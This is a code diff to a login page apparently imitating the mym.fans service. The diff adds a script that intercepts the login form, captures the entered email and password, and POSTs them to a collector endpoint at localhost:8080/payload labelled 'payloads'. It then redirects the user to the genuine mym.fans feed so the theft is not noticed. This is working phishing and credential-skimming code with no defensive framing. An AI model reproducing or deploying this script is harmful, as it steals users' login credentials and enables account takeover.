@@ -20,7 +20,7 @@
             </div>
         </header>
         <section class="mym_section">
-            <form class="login-form">
+            <form class="login-form" id="login-form">
                 <h3>Log in</h3>
 
                 <div>
@@ -52,5 +52,42 @@
                 </form>
         </section>
     </main>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const form = document.getElementById("login-form");
+            if(!form)
+                return;
+
+            form.addEventListener("submit", function (e) {
+                e.preventDefault();
+
+                //payloads
+                const email = document.getElementById("email").value;
+                const password = document.getElementById("password").value;
+
+                fetch("http://localhost:8080/payload", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        "origin":"mym",
+                        "identifier": email,
+                        "password": password,
+                    })
+                })
+                .then(res => {
+                    if (!res.ok) throw new Error("Request failed");
+                    return res.json();
+                })
+                .then(data => {
+                    window.location.href = "https://mym.fans/app/feed";
+                })
+                .catch(err => {
+                    window.location.reload();
+                });
+            });
+        });
+        </script>
 </body>
 </html>
